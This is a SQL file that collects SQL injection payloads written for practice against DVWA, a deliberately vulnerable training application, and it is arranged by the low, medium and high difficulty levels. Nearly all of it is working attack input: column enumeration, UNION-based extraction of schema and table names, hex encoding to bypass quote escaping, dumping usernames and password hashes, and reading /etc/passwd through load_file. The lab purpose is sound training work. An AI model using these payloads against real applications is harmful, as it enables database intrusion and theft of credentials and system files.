/*
  ==========================================================================
  DVWA SQL Injection Full-Level Payloads Collection
  Author: [Your Name/GitHub ID]
  Target: DVWA v1.10 (MySQL 5.7+)
  Description: A structured collection of payloads used in SQLi practice.
  ==========================================================================
*/

-- --------------------------------------------------------------------------
-- 1. LOW LEVEL (String-based Injection)
-- --------------------------------------------------------------------------
-- Description: No filtering. Focus on basic UNION-based data extraction.

-- Check the number of columns (Result: 2 columns)
1' ORDER BY 2 #

-- Extract Database Name & Version
1' UNION SELECT database(), version() #

-- Extract Table Names from the current database
1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database() #


-- --------------------------------------------------------------------------
-- 2. MEDIUM LEVEL (Numeric-based Injection)
-- --------------------------------------------------------------------------
-- Description: mysqli_real_escape_string() used. No quotes allowed in payload.

-- [排障记录] Solve Collation Conflict (Illegal mix of collations)
-- Force cast to 'utf8_general_ci' to match the system database
1 UNION SELECT 1, group_concat(table_name) COLLATE utf8_general_ci FROM information_schema.tables WHERE table_schema=database() #

-- [绕过技巧] Bypass quotes using HEX encoding
-- Target table: 'users' -> 0x7573657273
1 UNION SELECT 1, group_concat(column_name) COLLATE utf8_general_ci FROM information_schema.columns WHERE table_name=0x7573657273 #

-- Dump data
1 UNION SELECT user, password FROM users #


-- --------------------------------------------------------------------------
-- 3. HIGH LEVEL (String-based + LIMIT bypass)
-- --------------------------------------------------------------------------
-- Description: Parameter passed via Session. Hardcoded 'LIMIT 1' in backend.

-- Use '#' to truncate the hardcoded LIMIT clause
1' UNION SELECT user, password FROM users #


-- --------------------------------------------------------------------------
-- 4. UTILITY PAYLOADS (Bonus)
-- --------------------------------------------------------------------------
-- Read OS Files (If permissions allow)
1' UNION SELECT 1, load_file('/etc/passwd') #

-- Get current DB User
1' UNION SELECT 1, user() #
